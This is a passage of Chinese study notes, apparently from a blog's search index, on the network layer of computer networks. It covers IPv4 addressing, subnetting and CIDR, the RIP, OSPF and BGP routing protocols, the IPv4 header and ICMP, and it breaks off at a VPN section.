[{"title":"计算机网络-第四章-网络层","url":"/2021/11/05/计算机网络-第四章-网络层/","content":"\n# 网络层概述\n\n网络层的主要任务是**实现网络互连**，进而**实现数据包在各网络之间的传输**。\n\n要实现网络层任务，需要解决以下主要问题：\n\n- 网络层向运输层提供怎样的服务(“可靠传输”还是“不可靠传输”)\n- 网络层寻址问题\n- 路由选择问题\n    - 路由器依据数据包的目的地址和路由器中的路由表决定从哪个接口转发数据。\n    - 路由记录生成：人工配置、路由选择协议自动生成。\n\n**因特网(Internet)**是目前全世界用户数量最多的互联网，它使用**TCP/IP协议栈**。\n\n<!-- more -->\n\n由于TCP/IP协议栈的网络层使用**网际协议IP**，它是整个协议栈的核心协议，因此在TCP/IP协议栈中网络层常称为**网际层**。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(1).png)\n\n注：**网络层（网际层）**除了 **IP协议**外，还有之前介绍过的**地址解析协议ARP**，还有**网际控制报文协议ICMP**，**网际组管理协议IGMP**\n\n# 网络层提供的两种服务\n\n## 面向连接的虚电路服务\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(2).png)\n\n- 核心思想：**可靠通信由网络来保证。**\n- 在双方通信之前，需要先建立**网络层的连接**，也就是**虚电路(Virtual Circuit)**，以保证双方通信所需的一切网络资源。\n- 通信双方沿着**已建立的虚电路发送分组**\n    - 虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。\n    - 而电路交换的电话通信是先建立了一条真正的连接。两者类似但不同\n- 目的主机的地址仅在连接建立阶段使用，之后每个分组的首部只需携带一条虚电路的编号(构成虚电路的每一段链路都有一个虚电路编号)。\n- 这种通信方式如果再使用可靠传输的网络协议，就可使所发送的分组最终正确到达接收方(无差错按序到达、不丢失、不重复)。\n- **通信结束后，需要释放之前所建立的虚电路。**\n\n> 很多广域分组交换网都使用面向连接的虚电路服务。例如，曾经的X.25和逐渐过时的帧中继FR、 异步传输模式ATM等。\n\n---\n\n## 无连接的数据报服务\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(3).png)\n\n- 核心思想：**可靠通信由用户主机来保证。**\n- 在双方通信时，**不需要建立网络层连接**。\n- 每个分组可以**走不同的路径**，因此每个分组的**首部必须携带目的主机的完整地址**。\n- 这种通信方式所传送的**分组可能误码、丢失、重复和失序**。网络层只做到尽最大努力交付。\n- 由于**网络本身不提供端到端的可靠传输服务**，这就使网络中的路由器可以做得比较简单，而且价格低廉(与电信网的交换机相比较)。\n- 因特网采用了这种设计思想，也就是将**复杂的网络处理功能置于因特网的边缘**(用户主机和其内部的运输层)，而将相对简单的尽最大努力的分组交付功能置于因特网核心。\n\n> **采用这种设计思路的好处是**：网络的造价大大降低，运行方式灵活，能够适应多种应用。\n互连网能够发展到今日的规模，充分证明了当初采用这种设计思路的正确性。\n\n---\n\n## 虚电路服务和数据报服务的对比\n\n| **对比的方面**                 | **虚电路服务**                                     | **数据报服务**                                         |\n| ------------------------------ | -------------------------------------------------- | ------------------------------------------------------ |\n| **思路**                       | **可靠通信应当由网络来保证**                       | **可靠通信应当由用户主机来保证**                       |\n| **连接的建立**                 | **必须有**                                         | **不需要**                                             |\n| **终点地址**                   | **仅在连接建立阶段使用，每个分组使用短的虚电路号** | **每个分组都有终点的完整地址**                         |\n| **分组的转发**                 | **属于同一条虚电路的分组均按照同一路由进行转发**   | **每个分组独立选择路由进行转发**                       |\n| **当结点出故障时**             | **所有通过出故障的结点的虚电路均不能工作**         | **出故障的结点可能会丢失分组，一些路由可能会发生变化** |\n| **分组的顺序**                 | **总是按发送顺序到达终点**                         | **到达终点时不一定按发送顺序**                         |\n| **端到端的差错处理和流量控制** | **可以由网络负责，也可以由用户主机负责**           | **由用户主机负责**                                     |\n\n# IPv4\n\n## IPv4地址概述\n\n**IPv4地址**就是给因特网(Internet)上的**每一台主机(或路由器)的每一个接口**分配一在全世界范围内是**唯一的32比特的标识符**。\n\nIP地址由因特网名字和数字分配机构ICANN(Internet Corporation for Assigned Names and Numbers)进行分配。\n\n- 我国用户可向亚太网络信息中心APNIC(Asia Pacific Network Information Center)申请IP地址，需要缴费。\n- 2011年2月3日，互联网号码分配管理局IANA(由ICANN行使职能)宣布，IPv4地址已经分配完毕。\n- 我国在2014至201 5年也逐步停止了向新用户和应用分配IPv4地址。同时全面开展商用部署IPv6。\n\nIPv4地址的编址方法经历了如下三个历史阶段：\n\n- 1981年，分类编址\n- 1985年，划分子网\n- 1993年，无分类编址\n\n## 分类编址的IPv4地址\n\n每一类地址都由**网络号**和**主机号**组成，一个IP地址在整个互联网范围内是唯一的。\n\n- 只有A类、B类和C类地址可分配给网络中的主机或路由器的各接口\n- **主机号**为“全0\"的地址是**网络地址**，不能分配给主机或路由器的各接口\n- **主机号**为“全1\"的地址是**广播地址**，不能分配给主机或路由器的各接口\n- <img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(4).png\" width=\"50%\" />\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(5).png)\n\n说明：\n\n- A类地址：\n    - 最小网络号0，保留不指派\n    - 最大网络号127，作为本地环回测试地址，不指派\n    范围：127.0.0.1 — 127.255.255.254\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(6).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(7).png)\n\n---\n\n> **IP 地址是一种分等级的地址结构**。分两个等级的好处是：(网络号和主机号)\n- **第一**，IP 地址管理机构在分配 IP 地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配。这样就方便了 IP 地址的管理。\n- **第二**，路由器仅根据目的主机所连接的网络号来转发分组（而不考虑目的主机号），这样就可以使路由表中的项目数大幅度减少，从而减小了路由表所占的存储空间。\n\n> **实际上 IP 地址是标志一个主机（或路由器）和一条链路的接口**。\n- 当一个主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号 net-id 必须是不同的。这种主机称为**多归属主机** (multihomed host)。\n- 由于一个路由器至少应当连接到两个网络（这样它才能将 IP 数据报从一个网络转发到另一个网络），因此**一个路由器至少应当有两个不同的 IP 地址**。\n\n## 划分子网的的IPv4地址\n\n> 为什么要划分子网？\n答：主要还是因为ABC类网络的主机数量相差太多，一个公司想申请个网络号，C类只有254个不够用，而B类又有65534个，造成了大量的剩余浪费，IP地址空间利用率很低。而且若公司想要搭三个网络，那还得再申请两个网络号，申请网络号要需要等待时间和费用，而且会增加路由器中路由表的记录，因此，把一个网络再次划分是很好的办法，从主机号借一部分作为子网号。\n\n为了使用子网，我们引入了**子网掩码**来划分，从 1985 年起在 IP 地址中又增加了一个“**子网号字段**”，使两级的 IP 地址变成为**三级的 IP 地址**。\n\n这种做法叫做**划分子网** (subnetting) 。划分子网已成为互联网的正式标准协议。\n\n**划分子网**纯属**一个网络内部的事情，对外部网络透明**，对外仍然表现为没有划分子网的**一个网络**。\n\n- 32比特的子网掩码可以表明分类IP地址的主机号部分被借用了几个比特作为子网号\n    - 子网掩码使用**连续的比特1来对应网络号和子网号**\n    - 子网掩码使用**连续的比特0来对应主机号**\n    - 将划分子网的IPv4地址与其相应的子网掩码进行**逻辑与**运算就可得到IPv4地址所在子网的**网络地址**\n- **给定一个分类的IP地址和其相应的子网掩码，就可知道子网划分的细节：**\n    - **划分出的子网数量**\n    - **每个子网可分配的IP地址数量**\n    - **每个子网的网络地址和广播地址**\n    - **每个子网可分配的最小和最大地址**\n- 默认的子网掩码是指在未划分子网的情况下使用的子网掩码：\n    - A类: 255.0.0.0 | B类: 255.255.0.0 | C类: 255.255.255.0\n- 路由器在和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉相邻路由器。\n\n## 无分类编址的IPv4地址\n\n> 划分子网在一定程度上缓解了因特网在发展中遇到的困难，但是**数量巨大的C类**网因为**其地址空间太小**并**没有得到充分使用**，而因特网的IP地址仍在加速消耗，整个**IPv4地址空间面临全部耗尽的威胁**。\n\n为此，因特网工程任务组IETF又提出了采用**无分类编址**的方法来解决IP地址紧张的问题，同时还专门成立IPv6工作组负责研究新版本IP以彻底解决IP地址耗尽问题。\n\n1993年，IETF发布了**无分类域间路由选择CIDR**(Classless Inter-Domain Routing)的RFC文档：RFC 1517~1519和1520。\n\n- **CIDR消除了传统的A类、B类和C类地址，以及划分子网的概念；**\n- **CIDR可以更加有效地分配IPv4的地址空间**， 并且可以在新的IPv6使用之前允许因特网的规模继续增长。\n\nCIDR使用“**斜线记法**”，或称CIDR记法。即在IPv4地址后面加上斜线\"/”，在**斜线后面写上网络前缀所占的比特数量**。\n\n**CIDR 最主要的特点：**\n\n- CIDR使用各种长度的“**网络前缀**”(network-prefix)来代替分类地址中的网络号和子网号。\n- **IP 地址从三级编址（使用子网掩码）又回到了两级编址**。\n\nCIDR实际上是**将网络前缀都相同的连续的IP地址组成一个“CIDR地址块\"**\n\n- 我们只要知道CIDR地址块中的任何一个地址，就可以知道该地址块的全部细节:\n    - **地址块的最小地址**\n    - **地址块的最大地址**\n    - **地址块中的地址数量**\n    - **地址块聚合某类网络(A类、B类或C类)的数量**\n    - **地址掩码 (也可继续称为子网掩码)**\n\n路由聚合(构造超网)的方法是找共同前缀。**网络前缀越长，聚合地址块越小，路由越具体。**\n\n若路由器查表转发分组时发现有多条路由可选，则选择网络前缀最长的那条，这称为**最长前缀匹配**，因为这样的路由更具体。\n\n## IPv4地址的应用规划\n\n**定长的子网掩码FLSM（Fixed Length Subnet Mask）**\n\n- 使用**同一个子网掩码**来划分子网\n- 采用**定长**的子网掩码划分，只能划分出**2^n**个子网，其中n是从主机号部分借用的用来作为子网号的比特数量，每个子网所分配的IP地址数量相同\n- 因为每个子网所分配的IP地址数量相同，不够灵活，容易造成IP地址的浪费\n\n> **划分子网的IPv4就是定长的子网掩码**\n\n---\n\n**变长的子网掩码VLSM（Variable Length Subnet Mask）**\n\n- 使用**不同的子网掩码**来划分子网\n- 子网划分方式灵活：可以按需分配\n- 每个子网所分配的IP地址数量可以不同，尽可能减少对IP地址的浪费\n\n> **无分类编址的IPv4就是变长的子网掩码**\n\n# IP数据报的发送和转发过程\n\n**主机发送IP数据报：**\n\n判断目的主机是否与自己在同一个网络：\n\n- 若在**同一个网络**，则属于**直接交付**；\n- 若**不在同一个网络**，则属于**间接交付**，传输给主机所在网络的**默认网关**(路由器)，由默认网关帮忙转发；\n\n通过目的地址IP和源地址的子网掩码进行逻辑与运算得到目的网络地址。\n\n---\n\n**路由器转发IP数据报：**\n\n1. **检查IP数据报首部是否出错：**\n    - 若出错，则直接丢弃该IP数据报并通告源主机；\n    - 若没有出错，则进行转发；\n2. **根据IP数据报的目的地址在路由表中查找匹配的条目：**\n    - 若找到匹配的条目，则转发给条目中指示的下一跳；\n    - 若找不到，则丢弃该IP数据报并通告源主机；\n\n注：路由器隔离广播域，目标地址位广播地址的数据报不转发。\n\n# 静态路由配置\n\n静态路由配置是指用户或网络管理员使用路由器的相关命令给路由器**人工配置路由表**。\n\n- 这种人工配置方式简单、开销小。但**不能及时适应网络状态(流量、拓扑等)的变化**。\n- 一般只在小规模网络中采用。\n\n---\n\n使用静态路由配置可能出现以下**导致产生路由环路**的错误：\n\n- 配置错误\n    - 为防止IP数据报在路由环路中兜圈，在IP数据报首部设有生存时间TTL字段\n- 聚合了不存在的网络\n    - 为了防止聚合时将不存在的网络也囊括进去，可以对不存在的网络设置黑洞路由\n- 网络故障\n    - 若某网络出问题，路由器将该网络的路由表项删除并设置黑洞路由\n\n---\n\n路由条目的类型：\n\n- 直连网络\n- 静态路由(人工配置)\n- 动态路由(路由选择协议)\n\n特殊的静态路由条目\n\n- 默认路由(目的网络为0.0.0.0，地址掩码为0.0.0.0)\n    - 默认路由可以被所有网络匹配，但路由匹配有优先级，默认路由是优先级最低的\n- 特定主机路由(目的网络为特定主机的IP地址，地址掩码为255.255.255.255)\n    - 一般用于网络管理人员对网络的管理和测试\n    - 多条路由可选，匹配路由最具体的\n- 黑洞路由(下一跳为null0)\n\n# 路由选择协议\n\n路由选择可分为静态路由选择和动态路由选择。\n\n静态路由选择：\n\n- 由人工配置的网络路由、默认路由、特定主机路由、黑洞路由等都属于静态路由。\n- 这种人工配置方式简单、开销小。但**不能及时适应网络状态(流量、拓扑等)的变化**。\n- 一般只在小规模网络中采用。\n\n动态路由选择：\n\n- 路由器通过路由选择协议自动获取路由信息。\n- 比较复杂、开销比较大。能较好地适应网络状态的变化。\n- 适用于大规模网络。\n\n---\n\n因特网是全球最大的互联网络，它所采用的路由选择协议具有以下三个特点：\n\n- 自适应：动态路由选择，能较好地适应网络状态的变化\n- 分布式：路由器之间交换路由信息\n- 分层次：将整个因特网划分为许多较小的自治系统AS(Autonomous System)\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(8).png)\n\n自治系统之间的路由选择简称为**域间路由选择**\n域间路由选择使用**外部网关协议EGP**这个类别的路由选择协议\n\n自治系统内部的路由选择简称为**域内路由选择**\n域内路由选择使用**内部网关协议IGP**这个类别的路由选择协议\n\n**网关协议**的名称又可称为**路由协议**\n\n---\n\n**常见的路由选择协议**\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(9).png)\n\n---\n\n## 路由器的基本结构\n\n路由器是一种具有多个输入端口，和输出端口的专用计算机，其任务是转发分组\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(10).png)\n\n路由器结构可划分为两大部分：\n\n**1、分组转发部分**\n\n由三部分构成\n\n- 交换结构\n- 一组输入端口：\n    1. 信号从某个输入端口进入路由器\n    2. 物理层将信号转换成比特流，送交数据链路层处理\n    3. 数据链路层识别从比特流中识别出帧，去掉帧头和帧尾后，送交网络层处理\n    4. 如果送交网络层的分组是普通待转发的数据分组，则根据分组首部中的目的地址进行查表转发\n    5. 若找不到匹配的转发条目，则丢弃该分组，否则，按照匹配条目中所指示的端口进行转发\n- 一组输出端口\n    1. 网络层更新数据分组首部中某些字段的值，例如将数据分组的生存时间减1，然后送交数据链路层进行封装\n    2. 数据链路层将数据分组封装成帧，交给物理层处理\n    3. 物理层将帧看成比特流将其变换成相应的电信号进行发送\n\n> 路由器的各端口还会有输入缓冲区和输出缓冲区\n输入缓冲区用来暂存新进入路由器但还来不及处理的分组\n输出缓冲区用来暂存已经处理完毕但还来不及发送的分组\n\n注：**路由器的端口一般都具有输入和输出功能**，这些实例分出了输入端口和输出端口是更好演示路由基本工作过程\n\n---\n\n**2、路由选择部分**\n\n- 路由选择部分的核心构件是路由选择处理机，它的任务是根据所使用的路由选择协议。周期性地与其他路由器 进行路由信息的交互，来更新路由表\n- 如果送交给输入端口的网络层的分组是路由器之间交换路由信息的路由报文，则把这种分组送交给路由选择处理机\n- 路由选择处理机根据分组的内容来更新自己的**路由表**\n\n---\n\n## 路由信息协议RIP\n\n**路由信息协议RIP**(Routing Infomation Protocol)是内部网关协议IGP中最先得到广泛使用的协议之一， 其相关标准文档为RFC 1058。\n\nRIP要求自治系统AS内的每-个路由器都要维护从它自己到AS内其他每一个网络的距离记录。这是一组距离，称为“**距离向量D-V(Distance-Vector)**”。\n\nRIP使用**跳数**(Hop Count)作为度量(Metric)来**衡量到达目的网络的距离**。\n\n- 路由器到直连网络的距离定义为1；\n- 路由器到非直连网络的距离定义为所经过的路由器数加1；\n- 允许一条路径最多只能包含15个路由器。 **“距离\"等于16时相当于不可达。**因此，**RIP只适用于小型互联网。**\n\n---\n\nRIP认为**好的路由**就是“**距离短**”的路由，也就是**所通过路由器数量最少的路由。**\n\n- 当到达同一目的网络有多条“距离相等”的路由时，可以进行**等价负载均衡**。\n\nRIP包含以下三个要点：\n\n- **和谁交换信息**：仅和**相邻路由器**交换信息\n- **交换什么信息**：自己的**路由表**\n- **何时交换信息**：**周期性交换**(例如每30秒发送一次RIP更新报文)\n\n---\n\nRIP的基本工作过程：\n\n1. 路由器刚开始工作时，**只知道自己到直连网络的距离为1**；\n2. 每个路由器仅**和相邻路由器周期性地交换并更新路由信息**。\n3. 若干次交换和更新后，**每个路由器都知道到达本AS内各网络的最短距离和下一跳地址**，称为收敛。\n\nRIP的路由条目的更新规则：\n\n- 发现了新的网络，添加\n- 到达目的网络，相同下一跳，最新消息，更新\n- 到达目的网络，不同下一跳，新路由优势，更新\n- 到达目的网络，不同下一跳，新路由劣势，不更新\n- 到达目的网络，不同下一跳， 等价负载均衡\n\n---\n\nRIP存在“**坏消息传播得慢**”的问题，又称为**路由环路**或**距离无穷计数**问题，这是距离向量算法的一个固有问题。可以采取多种措施减少出现该问题的概率或减小该问题带来的危害。例如：\n\n- 限制最大路径距离为15 (16表示不可达)\n    - 环路兜圈直到距离为16时停下，所以说坏消息要传播很久才会停下来\n- 当路由表发生变化时就立即发送更新报文(即“**触发更新**”) ,而不仅是周期性发送\n- 让路由器记录收到某特定路由信息的接口，而不让同一路由信息再通过此接口向反方向传送(即“水平分割”)\n\n注：这些方法也不能完全解决“坏消息传播得慢”的问题，这是距离向量的本质决定。\n\n## 开放最短路径优先OSPF\n\n**开放最短路径优先 OSPF (Open Shortest Path First)**是为克服RIP的缺点在1989年开发出来的。\n\n- “开放” 表明OSPF协议不是受某-家厂商控制，而是公开发表的。\n- “最短路径优先”是因为使用了Dijkstra提出的**最短路径算法**SPF。\n\n**OSPF是基于链路状态**的，而不像RIP那样是基于距离向量的。\n\nOSPF采用SPF算法计算路由，从算法上保证了**不会产生路由环路**。\n\n**OSPF不限制网络规模**，更新效率高，**收敛速度快**。\n\n链路状态是指本路由器都和**哪些路由器相邻**，以及相应**链路的“代价”(cost)**。\n\n- “代价” 用来表示费用、距离、时延、带宽等等。这些都由网络管理人员来决定。\n\n---\n\n使用OSPF的每个路由器都会产生**链路状态通告LSA(Link State Advertisement)**。\n\nLSA中包含以下内容：\n\n- 直连网络的链路状态信息\n- 邻居路由器的链路状态信息\n\nLSA被封装在**链路状态更新分组LSU**中，采用洪泛法发送。\n\n使用OSPF的每个路由器都有一个**链路状态数据库LSDB**，用于存储LSA。\n\n通过各路由器洪泛发送封装有自己LSA的LSU分组，各路由器的LSDB最终将达到一致。\n\n使用OSPF的各路由器**基于LSDB进行最短路径优先SPF计算**，构建出各自到达其他各路由器的最短路径，即构建各自的路由表。\n\n- 各路由器可以通过LSDB构建带权有向图，对该图进行Dijkstra的最短路径优先算法，就可以得到各路由器为跟的最短路径。\n\n---\n\nOSPF有以下五种分组类型：\n\n- 问候(Hello) 分组\n    - 用来发现和维护邻居路由器的可达性。\n- 数据库描述 (Database Description)分组\n    - 向邻居路由器给出自己的链路状态数据库中的所有链路状态项目的摘要信息。\n- 链路状态请求 (Link State Request)分组\n    - 向邻居路由器请求发送某些链路状态项目的详细信息。\n- 链路状态更新 (Link State Update)分组\n    - 路由器使用这种分组将其链路状态进行洪泛发送，即用洪泛法对全网更新链路状态。\n- 链路状态确认 (Link State Acknowledgment)分组\n    - 这是对链路状态更新分组的确认分组。\n\n---\n\nOSPF在多点接入网络中路由器邻居关系的建立\n\n> 所谓的多点接入网络，就是说这些接入的路由器都互为邻居关系\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(11).png)\n\n为了减少hello分组发送的数量，OSPF采用 **选举指定路由器DR**(designated router)和**备用的指定路由器BDR**(backup designated router)\n\n- 所有的非DR/BDR只与DR/BDR建立邻居关系\n- 非DR/BDR之间通过DR/BDR交换信息\n\n---\n\n为了使OSPF能够用于规模很大的网络，OSPF把一个自治系统再划分为若干个更小的范围，叫做区域(Area) 。\n\n划分区域的好处就是把利用洪泛法交换链路状体信息的范围局限于每一 个区域而不是整个自治系统，这就减少了整个网络上的通信量。\n\n## 边界网关协议BGP\n\nBGP(Border Gateway Protocol)是**不同自治系统的路由器之间**交换路由信息的协议。\n\n> 在上面介绍了内部网关协议IGP (例如路由信息协议RIP或开放最短路径优先OSPF)，它们都是**设法使分组在一个自治系统内尽可能有效地从源网络传输到目的网络，无需考虑自治系统外部其他方面的策略。**\n\n在不同自治系统内，度量路由的“代价”(距离， 带宽，费用等)可能不同。\n因此，对于自治系统之间的路由选择,使用“代价”作为度量来寻找最佳路由是不行的。需要采用**外部网关协议EGP**(例如边界网关协议BGP)\n\n自治系统之间的路由选择必须考虑相关策略(政治,经济,安全等)\n\nBGP只能是力求寻找一条能够到达目的网络且比较好的路由(不能兜圈子)，而并非要寻找一条最佳路由。\n\n---\n\n在配置BGP时，每个自治系统的管理员要选择至少一个路由器作为该自治系统的“**BGP发言人**”\n\n不同自治系统的BGP发言人要交换路由信息，首先必须建立**TCP连接**，端口号为179\n\n- 在此TCP连接上交换BGP报文以建立**BGP会话**\n- 利用BGP会话**交换路由信息(**例如，增加新的路由，或撤销过时的路由，以及报告出错的情况等)\n- 使用TCP连接交换路由信息的两个BGP发言人，彼此称为对方的**邻站**(neighbor) 或**对等站**(peer)\n\nBGP发言人除了运行BGP外，还必须运行自己所在自治系统所使用的内部网关协议IGP，例如OSPF或RIP。\n\nBGP发言人**交换网络可达性的信息**(要到达某个网络所要经过的一系列自治系统)\n\n当BGP发言人互相交换了网络可达性的信息后，各BGP发言人就**根据**所采用的**策略**从收到的路由信息中**找出到达各自治系统的较好的路由**。也就是构造出树形结构、**不存在回路的自治系统连通图**。\n\n---\n\n边界网关协议BGP适用于多级结构的因特网\n\nBGP-4有以下四种报文\n\n- OPEN(打开)报文：用来与相邻的另一个BGP发言人建立关系，使通信初始化。\n- UPDATE(更新)报文：用来通告某一路由的信息，以及列出要撤销的多条路由。\n- KEEPALIVE(保活)报文：用来周期性地证实邻站的连通性。\n- NOTIFICATION(通知)报文：用来发送检测到的差错。\n\n## 直接封装RIP、OSPF、BGP报文的协议\n\n分别是UDP、IP、TCP\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(12).png)\n\n# 4.7 IPv4数据报的首部格式\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(13).png)\n\n一个 IP 数据报由**首部**和**数据**两部分组成。\n\n**首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。**\n\n- 可选字段\n  \n    长度从1个字节到40个字节不等。用来支持排错、测量及安全等措施。\n    \n    可选字段增加了IP数据报的功能，但这同时也使得IP数据报的首部长度成为可变的。这就增加了每一个路由器处理IP数据报的开销。实际上可选字段很少被使用。\n    \n- 填充字段\n  \n    确保首部长度为4字节的整数倍。使用全0进行填充。\n\n---\n\n- 版本\n  \n    占4比特，表示IP协议的版本。\n    \n    通信双方使用的IP协议的版本必须一致。目前广泛使用的IP协议版本号为4 (即IPv4)。\n    \n- 首部长度\n  \n    占4比特，表示IP数据报首部的长度。该字段的取值以4字节为单位。\n    \n    最小十进制取值为5，表示IP数据报首部只有20字节固定部分。\n    \n    最大十进制取值为15，表示IP数据报首部包含20字节固定部分和最大40字节可变部分。\n    \n- 区分服务\n  \n    占8比特，用来获得更好的服务。\n    \n    该字段在旧标准中叫做服务类型，但实际上一直没有被使用过，1998年， 因特网工程任务组IETF把这个字段改名为区分服务。\n    \n    利用该字段的不同数值可提供不同等级的服务质量。\n    \n    只有在使用区分服务时，该字段才起作用。一般情况下都不使用该字段。\n    \n- 总长度\n  \n    占16比特，表示IP数据报的总长度(首部+数据载荷)。\n    \n    最大取值为十进制的65535，以字节为单位。\n\n---\n\n> 以下三个字段共同用于IP数据报分片。\n\n扩：以太网的最大传送单元MTU为1500字节。\n\n- 标识\n  \n    占16比特，属于同一个数据报的各分片数据报应该具有相同的标识。\n    \n    IP软件维持一个计数器，每产生一个数据报，计数器值加1，并将此值赋给标识字段。\n    \n- 标志\n  \n    占3比特，各比特含义如下：\n    \n    - DF位：1表示不允许分片，0表示允许分片；\n    - MF位：1表示”后面还有分片”，0表示“这是最后一个分片”；\n    - 保留位：必须为0。\n- 片偏移\n  \n    占13比特， 指出分片数据报的数据载荷部分偏移其在原数据报的位置有多少个单位。\n    \n    片偏移以8个字节为单位。\n\n---\n\n- 生存时间TTL\n  \n    占8比特，表示IP数据报的生存时间。\n    \n    最初以秒为单位，最大生存周期为255秒；路由器转发IP数据报时，将IP数据报首部中的该字段的值减去IP数据报在本路由器上所耗费的时间，若不为0就转发，否则就丢弃。\n    \n    现在以\"跳数”为单位，路由器转发IP数据报时，将IP数据报首部中的该字段的值减1，若不为0就转发，否则就丢弃。\n    \n- 协议\n  \n    占8比特，指明IPv4数据报的数据部分是何种协议数据单元。\n    \n    常用的一些协议和相应的协议字段值如下。\n    \n    - ICMP：1，IGMP：2，TCP：6，UDP：17，IPv6：41，OSPF：89\n- 首部检验和\n  \n    占16比特，用来检测首部在传输过程中是否出现差错。比CRC检验码简单，称为因特网检验和。\n    \n    IP数据报每经过一个路由器，路由器都要重新计算首部检验和，因为某些字段(生存时间、标志、片偏移等)的取值可能发生变化。\n    \n    由于IP层本身并不提供可靠传输的服务，并且计算首部校验和是一项耗时的操作。因此在IPv6中，路由器不再计算首部校验和，从而更快转发IP数据报。\n\n---\n\n- 源IP地址和目的IP地址各占32比特，用来填写 发送该IP数据报的源主机的IP地址 和 接收该IP数据报的目的主机的IP地址。\n\n# 网际控制报文协议ICMP\n\n为了更有效地转发IP数据报和提高交付成功的机会，在网际层使用了**网际控制报文协议ICMP**(Internet Control Message Protocol)。\n\n主机或路由器使用ICMP来发送**差错报告报文**和**询问报文**。\n\n> **重点**：**ICMP报文被封装在IP数据报**中发送。\n\n## ICMP差错报告报文\n\nICMP差错报告报文共有以下五种：\n\n- 终点不可达\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(14).png)\n    \n    - 当路由器或主机不能交付数据报时，就向源点发送终点不可达报文。\n    - 具体可再根据ICMP的代码字段细分为目的网络不可达、目的主机不可达、目的协议不可达、目的端口不可达、目的网络未知、目的主机未知等13种错误。\n- 源点抑制\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(15).png)\n    \n    - 当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文,使源点知道应当把数据报的发送速率放慢。\n- 时间超过\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(16).png)\n    \n    - 当路由器收到一个目的IP地址不是自己的IP数据报，会将其生存时间TTL字段的值减1。\n    - 若结果不为0，则将该IP数据报转发出去；若结果为0，除丢弃该IP数据报外，还要向源点发送时间超过报文。\n    - 另外，当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃,也会向源点发送时间超过报文。\n- 参数问题\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(17).png)\n    \n    - 当路由器或目的主机收到IP数据报后，根据其首部中的检验和字段发现首部在传输过程中出现了误码，就丢弃该数据报，并向源点发送参数问题报文。\n- 改变路由(重定向)\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(18).png)\n    \n    - 路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器(可通过更好的路由)。\n\n---\n\n以下情况不应发送ICMP差错报告报文:\n\n- 对ICMP差错报告报文不再发送ICMP差错报告报文\n- 对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文\n- 对具有多播地址的数据报都不发送ICMP差错报告报文\n- 对具有特殊地址(如127.0.0.0或0.0.0.0) 的数据报不发送ICMP差错报告报文\n\n---\n\n## ICMP询问报文\n\n常用的ICMP询问报文有以下两种：\n\n- **回送请求和回答**\n    - ICMP回送请求报文是由主机或路由器向一个特定的目的主机发出的询问。\n    - 收到此报文的主机必须给源主机或路由器发送ICMP回送回答报文。\n    - 这种询问报文用来**测试目的站是否可达**及了解其有关状态。\n- **时间戳请求和回答**\n    - ICMP时间戳请求报文是请某个主机或路由器回答当前的日期和时间。\n    - 在ICMP时间戳回答报文中有一个32位的字段，其中写入的整数代表从\n    1900年1月1日起到当前时刻一共有多少秒。\n    - 这种询问报文用来**进行时钟同步和测量时间**。\n\n## ICMP应用\n\n**分组网间探测PING（Packet InterNet Groper）**\n\n- 用来测试主机或路由器间的连通性\n- 应用层直接使用网际层的ICMP (没有通过运输层的TCP或UDP)\n- 用ICMP回送请求和回答报文\n\n**跟踪路由（traceroute）**\n\n用来测试IP数据报从源主机到达目的主机要经过哪些路由器\n\nWindows版本\n\n- tracert命令\n- 应用层直接使用网际层ICMP\n- 使用了ICMP回送请求和回答报文以及差错报告报文\n\nUnix版本\n\n- traceroute命令\n- 在运输层使用UDP协议\n- 仅使用ICMP差错报告报文\n\n工作原理：通过发送TTL为n的报文，待收到ICMP差错报文(时间超过)就可以知道跳数为n的路由器，发送1~n的报文就可以知道整条路径上经过的路由器。\n\n# VPN & NAT\n\n## 虚拟专用网VPN\n\n**VPN(Virtual Private 